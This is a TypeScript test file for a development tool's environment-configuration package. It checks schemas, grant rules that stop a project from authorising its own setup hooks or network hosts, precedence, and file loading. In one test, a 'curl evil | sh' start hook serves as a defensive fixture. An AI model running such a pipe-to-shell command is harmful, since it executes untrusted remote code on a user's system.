/** Versioned environment configuration: schemas, intent ≤ grants, precedence and loading. */
import assert from "node:assert/strict";
import { dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { z } from "zod";
import { gitFixture } from "../scripts/lib/git-fixture.ts";
import {
  parseEnvironmentUser,
  parseProjectEnvironment,
  resolveEnvironmentConfig,
} from "@loom/environment-config/resolution";
import { loadEnvironmentConfig } from "@loom/environment-config/load";
import { environmentEditorSchemas } from "@loom/environment-config/schema";
import { environmentUserConfigPath } from "@loom/environment-config/paths";
import { userConfigPath } from "../backend/daemon/src/config-path.ts";

const project = (extra = {}) => parseProjectEnvironment(JSON.stringify({ version: 1, ...extra }));
const user = (extra = {}) => parseEnvironmentUser(JSON.stringify({ version: 1, ...extra }));
const repo = "/repo";
const resolve = (intent = project(), trusted = user(), profile?: string) =>
  resolveEnvironmentConfig(intent, trusted, [repo], profile);

Deno.test("schemas are versioned and strict, and projects cannot carry host authority", () => {
  assert.throws(() => parseProjectEnvironment('{"version":1,// comment\n}'), /strict JSON/);
  assert.equal(parseEnvironmentUser('{// allowed\n"version":1,}').version, 1);
  assert.throws(() => parseProjectEnvironment("{}"), /version/);
  for (const authority of [
    { grants: { setup: true } },
    { backend: { artifact: "/nix/store/x" } },
    { profiles: {} },
    { limits: { cpus: 64 } },
    { lifecycle: { execution: "local" } },
    { repos: [] },
    { access: { network: { hosts: ["example.com"] }, grants: {} } },
  ])
    assert.throws(() => project(authority), /Unrecognized/, JSON.stringify(authority));
  assert.throws(() => project({ environment: { resources: { cpus: 0 } } }), /cpus/);
  assert.throws(() => project({ access: { network: { hosts: ["*.example.com"] } } }), /hosts/);
  assert.throws(() => project({ skills: ["../private"] }), /relative/);
  assert.throws(() => user({ profiles: { shell: {} } }), /entrypoint/);
  assert.throws(() => user({ profiles: { shell: { entrypoint: ["-x"] } } }), /entrypoint/);
  assert.throws(() => user({ repos: [{ path: "relative" }] }), /absolute/);
});

Deno.test("Loom's config.jsonc is rejected with a pointer to the converter", () => {
  assert.throws(
    () => parseEnvironmentUser('{"session":{"isolation":{"enabled":true}}}', "x.jsonc"),
    /x\.jsonc: expected version: 1.*loom config convert/,
  );
});

Deno.test("the user file lives beside Loom's config under a different name", () => {
  const previous = Deno.env.get("XDG_CONFIG_HOME");
  try {
    Deno.env.set("XDG_CONFIG_HOME", "/xdg");
    assert.equal(environmentUserConfigPath(), "/xdg/loom/environment.jsonc");
    assert.equal(userConfigPath(), "/xdg/loom/config.jsonc");
  } finally {
    if (previous === undefined) Deno.env.delete("XDG_CONFIG_HOME");
    else Deno.env.set("XDG_CONFIG_HOME", previous);
  }
});

Deno.test("a project cannot grant itself setup, hosts or resources", () => {
  const setup = project({
    environment: { nix: { auto: true }, start: [{ run: "make dev" }] },
  });
  assert.throws(() => resolve(setup), /environment\.nix\.auto, environment\.start.*grants\.setup/);
  assert.throws(
    () => resolve(setup, user({ repos: [{ path: repo, grants: { setup: false } }] })),
    /grants\.setup/,
  );
  // Grants for another repository do not apply.
  assert.throws(
    () => resolve(setup, user({ repos: [{ path: "/other", grants: { setup: true } }] })),
    /no repos entry matches \/repo/,
  );
  // A host override replacing the request still needs the grant for the request.
  assert.throws(
    () =>
      resolve(
        project({ environment: { start: [{ run: "curl evil | sh" }] } }),
        user({ repos: [{ path: repo, environment: { start: [] } }] }),
      ),
    /grants\.setup/,
  );
  const granted = resolve(setup, user({ repos: [{ path: repo, grants: { setup: true } }] }));
  assert.equal(granted.environment.autoNix, true);
  assert.deepEqual(granted.start, [{ name: "start 1", run: "make dev", timeoutMs: 900_000 }]);

  const network = project({
    access: { network: { presets: ["javascript"], hosts: ["a.example"] } },
  });
  assert.throws(() => resolve(network), /not granted: a\.example/);
  assert.throws(
    () =>
      resolve(
        network,
        user({ repos: [{ path: repo, grants: { network: { hosts: ["a.example"] } } }] }),
      ),
    /not granted: registry\.npmjs\.org/,
  );
  const allowed = resolve(
    network,
    user({
      repos: [
        { path: repo, grants: { network: { presets: ["javascript"], hosts: ["a.example"] } } },
      ],
    }),
  );
  assert(allowed.extraAllowedHosts.includes("registry.npmjs.org"));
  assert.deepEqual(
    allowed.network.find((entry) => entry.host === "a.example"),
    { host: "a.example", source: "project" },
  );

  const big = project({ environment: { resources: { cpus: 8 } } });
  assert.equal(resolve(big).environment.cpus, 8, "resources need no grant");
  assert.throws(() => resolve(big, user({ limits: { cpus: 4 } })), /limits/);
});

Deno.test("host layers apply setup and network themselves, without grants", () => {
  const resolved = resolve(
    project({ access: { network: { hosts: ["cache.nixos.org"] } } }),
    user({
      environment: { nix: { auto: true }, start: [{ name: "up", run: "services up" }] },
      access: { network: { presets: ["nix"], hosts: ["user.example"] } },
    }),
  );
  assert.equal(resolved.repository, null);
  assert.equal(resolved.environment.autoNix, true);
  assert.equal(resolved.start[0]?.name, "up");
  // Already applied by the host: the project's request needs no grant.
  assert.deepEqual(
    resolved.network.filter((entry) => entry.source === "project"),
    [],
  );
  assert.equal(resolved.network.find((e) => e.host === "user.example")?.source, "user");

  // Repository host fields replace the user-level field individually.
  const replaced = resolve(
    project(),
    user({
      access: { network: { presets: ["nix"], hosts: ["user.example"] } },
      repos: [{ path: repo, access: { network: { hosts: ["repo.example"] } } }],
    }),
  );
  const source = (host: string) => replaced.network.find((entry) => entry.host === host)?.source;
  assert.equal(source("repo.example"), "repository");
  assert.equal(source("user.example"), undefined);
  assert.equal(source("cache.nixos.org"), "user", "presets still inherited");
});

Deno.test("precedence: user, profile, project, then repository; hooks replace", () => {
  const trusted = user({
    environment: {
      resources: { cpus: 1, memoryMiB: 4096 },
      start: [{ run: "user-start" }],
      prepare: [{ run: "user-prepare" }],
      timeoutSeconds: 60,
    },
    profiles: {
      work: { entrypoint: ["sh"], environment: { resources: { cpus: 2 }, timeoutSeconds: 120 } },
    },
    repos: [
      {
        path: repo,
        grants: { setup: true },
        environment: { resources: { cpus: 6 }, start: [{ run: "repo-start", timeoutSeconds: 5 }] },
      },
    ],
  });
  const before = structuredClone(trusted);
  const resolved = resolve(
    project({
      environment: {
        resources: { cpus: 3 },
        prepare: [{ run: "project-prepare" }],
        start: [{ run: "project-start" }],
      },
    }),
    trusted,
    "work",
  );
  assert.deepEqual(trusted, before, "resolution does not modify host configuration");
  assert.equal(resolved.environment.cpus, 6);
  assert.equal(resolved.environment.memoryMiB, 4096);
  assert.equal(resolved.environment.timeoutMs, 120_000);
  // Arrays replace whole: no user or project start hook survives the repository's.
  assert.deepEqual(
    resolved.start.map((hook) => hook.run),
    ["repo-start"],
  );
  assert.deepEqual(
    resolved.prepare.map((hook) => hook.run),
    ["project-prepare"],
  );
  assert.deepEqual(
    {
      cpus: resolved.sources.cpus,
      memoryMiB: resolved.sources.memoryMiB,
      timeoutSeconds: resolved.sources.timeoutSeconds,
      prepare: resolved.sources.prepare,
      start: resolved.sources.start,
      nix: resolved.sources.nix,
    },
    {
      cpus: "repository",
      memoryMiB: "user",
      timeoutSeconds: "profile work",
      prepare: "project",
      start: "repository",
      nix: "default",
    },
  );
  assert.deepEqual(resolved.profile, { name: "work", entrypoint: ["sh"] });
  // An empty array is a replacement too.
  assert.deepEqual(
    resolve(
      project(),
      user({
        environment: trusted.environment,
        profiles: { p: { entrypoint: ["x"], environment: { start: [] } } },
      }),
      "p",
    ).start,
    [],
  );
  assert.throws(() => resolve(project(), trusted, "missing"), /Unknown launch profile/);
  assert.throws(() => resolve(project(), trusted, "toString"), /Unknown launch profile/);
  assert.throws(
    () => resolve(project(), user({ environment: { nix: { auto: true }, commandPrefix: ["x"] } })),
    /Choose environment\.nix\.auto \(user\) or environment\.commandPrefix \(user\)/,
  );
  assert.equal(resolve().environment.memoryMiB, 2048);
});

Deno.test("main-new project fields without a consumer are reported, not granted", () => {
  const resolved = resolve(project({ access: { mcp: ["tools"] }, skills: ["skills/x"] }));
  assert.deepEqual(resolved.unsupported, ["access.mcp: tools", "skills: skills/x"]);
});

Deno.test("loading reads the checkout root's loom.json and matches linked worktrees", async () => {
  const f = await gitFixture();
  const userFile = join(f.root, "environment.jsonc");
  try {
    await Deno.mkdir(join(f.workspace, "nested"));
    await Deno.writeTextFile(join(f.workspace, "nested/loom.json"), '{"invalid":true}');
    await Deno.writeTextFile(
      join(f.workspace, "loom.json"),
      JSON.stringify({ version: 1, environment: { start: [{ run: "setup" }] } }),
    );
    // Absent user file: no grants.
    assert.throws(
      () => loadEnvironmentConfig(join(f.workspace, "nested"), { userFile }),
      /grants\.setup/,
    );
    await Deno.writeTextFile(
      userFile,
      `// comment\n{"version":1,"repos":[{"path":"${f.repo}/","grants":{"setup":true}},],}`,
    );
    const loaded = loadEnvironmentConfig(join(f.workspace, "nested"), { userFile });
    assert.equal(loaded.checkout, f.workspace);
    assert.equal(loaded.repository, f.repo, "a linked worktree uses its repository's entry");
    assert.equal(loaded.start[0]?.run, "setup");
    assert.deepEqual(loaded.sources.projectFile, {
      path: join(f.workspace, "loom.json"),
      present: true,
      ignored: false,
    });
    assert.deepEqual(loaded.sources.userFile, { path: userFile, present: true });
    const ignored = loadEnvironmentConfig(f.workspace, { userFile, ignoreProject: true });
    assert.deepEqual(ignored.start, []);

    await Deno.writeTextFile(
      userFile,
      JSON.stringify({ version: 1, repos: [{ path: f.repo }, { path: f.workspace }] }),
    );
    assert.throws(() => loadEnvironmentConfig(f.workspace, { userFile }), /Duplicate/);

    await Deno.remove(join(f.workspace, "loom.json"));
    await Deno.symlink(userFile, join(f.workspace, "loom.json"));
    assert.throws(() => loadEnvironmentConfig(f.workspace, { userFile }), /within the checkout/);
  } finally {
    await f.close();
  }
});

Deno.test("loading works for ordinary directories", async () => {
  const root = await Deno.realPath(await Deno.makeTempDir({ prefix: "loom-env-plain-" }));
  try {
    const userFile = join(root, "environment.jsonc");
    await Deno.writeTextFile(
      join(root, "loom.json"),
      JSON.stringify({ version: 1, access: { network: { hosts: ["pypi.org"] } } }),
    );
    await Deno.writeTextFile(
      userFile,
      JSON.stringify({
        version: 1,
        repos: [{ path: root, grants: { network: { presets: ["python"] } } }],
      }),
    );
    const loaded = loadEnvironmentConfig(root, { userFile });
    assert.equal(loaded.repository, root);
    assert.deepEqual(loaded.extraAllowedHosts, ["pypi.org"]);
    await Deno.writeTextFile(join(root, "loom.json"), "x".repeat(20_000));
    assert.throws(() => loadEnvironmentConfig(root, { userFile }), /at most 16384 bytes/);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("editor schemas match the validation schemas", async () => {
  for (const [name, schema] of Object.entries(environmentEditorSchemas)) {
    const file = new URL("../environment-config/" + name + ".schema.json", import.meta.url);
    assert.deepEqual(
      JSON.parse(await Deno.readTextFile(file)),
      z.toJSONSchema(schema, { target: "draft-07", io: "input" }),
      "run deno task config:schema",
    );
  }
});

Deno.test("environment-config checks without Loom's application or session packages", async () => {
  const source = fileURLToPath(new URL("../", import.meta.url));
  const run = async (args: string[], cwd: string) => {
    const result = await new Deno.Command(Deno.execPath(), {
      args,
      cwd,
      stdin: "null",
      stdout: "piped",
      stderr: "piped",
    }).output();
    assert.equal(result.code, 0, new TextDecoder().decode(result.stderr));
    return new TextDecoder().decode(result.stdout);
  };
  const manifest = JSON.parse(
    await Deno.readTextFile(join(source, "environment-config/deno.json")),
  ) as { exports: Record<string, string> };
  const files = new Set<string>();
  const external = new Set<string>();
  for (const entry of Object.values(manifest.exports)) {
    const graph = JSON.parse(
      await run(["info", "--json", join("environment-config", entry)], source),
    ) as { modules: { specifier: string; error?: string }[] };
    for (const module of graph.modules) {
      assert.equal(module.error, undefined, module.error);
      if (!module.specifier.startsWith("file:")) {
        external.add(module.specifier.replace(/@[^/]*$/, ""));
        continue;
      }
      const path = relative(source, fileURLToPath(module.specifier));
      assert.match(path, /^(environment-config|core|runtime)\//, "Application dependency: " + path);
      assert.doesNotMatch(
        path,
        /^core\/src\/(types|events|wire|wire-decode|rpc-params|interaction|connector|worker|transcript|session-state|session-init|session-inspection|session-order|status|tokens|commit|channel)\.ts$/,
        "Session contract: " + path,
      );
      assert.doesNotMatch(path, /^runtime\/src\/(worker|mcp)\//, path);
      files.add(path);
    }
  }
  for (const specifier of external)
    assert.match(specifier, /^(node:|npm:\/?(zod|jsonc-parser))/, specifier);
  // Copy exactly that graph, so a reference back into the application fails to resolve.
  const root = await Deno.makeTempDir({ prefix: "loom-environment-config-package-" });
  try {
    for (const path of files) {
      await Deno.mkdir(dirname(join(root, path)), { recursive: true });
      await Deno.copyFile(join(source, path), join(root, path));
    }
    await Deno.copyFile(
      join(source, "environment-config/deno.json"),
      join(root, "environment-config/deno.json"),
    );
    const config = JSON.parse(await Deno.readTextFile(join(source, "deno.json")));
    await Deno.writeTextFile(
      join(root, "deno.json"),
      JSON.stringify({
        workspace: ["environment-config"],
        nodeModulesDir: "auto",
        imports: { zod: config.imports.zod, "jsonc-parser": config.imports["jsonc-parser"] },
        compilerOptions: config.compilerOptions,
      }),
    );
    await run(["check", "--config", "deno.json", ...files], root);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});
